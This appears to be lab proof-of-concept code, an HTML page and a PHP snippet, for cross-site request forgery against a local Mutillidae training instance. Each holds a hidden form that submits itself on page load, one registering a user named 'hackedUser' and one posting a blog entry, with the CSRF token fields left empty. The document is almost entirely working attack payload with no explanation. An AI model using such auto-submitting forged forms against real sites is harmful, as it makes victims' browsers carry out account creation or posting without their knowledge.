<html>

<body>
    <form id="registerUserFrom" method="post" action="http://192.168.1.41/mutillidae/index.php?page=register.php">
        <input name="csrf-token" value="" />
        <input name="username" value="hackedUser" />
        <input name="password" value="hackedUser" />
        <input name="confirm_password" value="hackedUser" />
        <textarea name="my_signature" value="created from registerUserScript">hackedUser</textarea>
        <input name="register-php-submit-button" value="Save Blog Entry" />
    </form>
    <script>
        document.addEventListener('DOMContentLoaded', function () {
            document.getElementById('registerUserFrom').submit();
        }, false);
    </script>
</body>

</html>


<?php

echo '
<body>
    <form id="addToBlogFrom" method="post" action="http://192.168.1.41/mutillidae/index.php?page=add-to-your-blog.php">
        <input name="csrf-token" value="" />
        <textarea name="blog_entry">hacked from addNewBlog successfully!</textarea>
        <input name="add-to-your-blog-php-submit-button" value="Save Blog Entry" />
    </form>
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            document.getElementById("addToBlogFrom").submit();
        }, false);
    </script>
</body>'

    ?>